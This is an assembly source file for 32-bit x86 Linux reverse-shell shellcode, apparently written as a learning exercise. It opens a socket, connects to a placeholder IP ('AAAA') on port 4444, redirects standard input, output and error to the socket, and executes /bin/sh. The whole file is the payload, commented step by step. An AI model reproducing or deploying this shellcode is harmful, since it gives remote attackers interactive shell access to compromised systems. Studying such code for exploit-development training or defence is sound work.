; REVERSE_SHELL


global _start

section .text

_start:


;  syscall socket ---> socket call

;  socketcall= eax->SOCKET ebx->socket()->args*->esp
;  socket = esp->AF_INET, SOCK_STREAM, 0


	; GET SOCKET FILE DESCRIPTOR
	xor eax, eax
	push eax;               0  for uneeded options

	mov al, 0x01
	push eax;               1  for SOCK_STREAM

	mov al, 0x02
	push eax;               2  for AF_INET
	
	; at this point socket() function args should be setup

	mov al, 0x66;           102 for SOCKETCALL
	
	xor ebx, ebx
	mov bl, 0x01;           SYS_SOCKET

	mov ecx, esp;                SOCKET ARGS*

	int 0x80

	; SETUP SOCKADDR
	; IP_HOLDER = AAAA

	mov edi, eax;             saving socket fd for later

	push 0x41414141;          AAAA
	
	mov word [esp-2], 0x5c11; 0x115c for port 4444

	mov al, 0x02
	mov [esp-4], ax;          2 for AF_INET

	sub esp, 0x04;            Adjust stack(PORT and AD_INET share word)

	mov ecx, esp;             Saving stack *addr

	; SETUP CONNECT

	push 0x10;                socklen_t is 16
	push ecx;                 *addr
	push edi;                 sock fd

	; SETUP SOCKET_CALL

	mov ecx, esp;             SOCKET ARGS
	xor ebx, ebx
	mov bl, 0x03;            SYS_CONNECT
	mov al, 0x66;             SOCKETCALL syscall

	int 0x80

	; DUP2 STDIN, STDOUT, STDERR

	xor eax, eax
	mov al, 0x3f;            63 for dup2 syscall

	mov ebx, edi;             sock fd

	xor ecx, ecx;             0 for stdin

	int 0x80

	xor eax, eax
    mov al, 0x3f;            63 for dup2 syscall

	mov cl, 0x01;             1 for stdout 

	int 0x80

	xor eax, eax
    mov al, 0x3f;            63 for dup2 syscall

    mov cl, 0x02;             2 for stderr

    int 0x80

	jmp short load_bin_sh_addr

exec_shell:

	pop ebx;                  filename from jump call pop technique

	mov dword ecx, [ebx+4];   Moves "//sh" into ecx
	
	shr ecx, 8;               Remove extra "/"

	mov dword [ebx+4], ecx;   Moves nulled terminated /sh

	xor ecx, ecx;             set argv to NULL as not needed

	xor edx, edx;             set envp to NULL as not needed

	xor eax, eax
	mov al, 0x0b;             hex for 11 -> execve syscall

	int 0x80

load_bin_sh_addr:
	call exec_shell
	bin_sh db "/bin//sh"
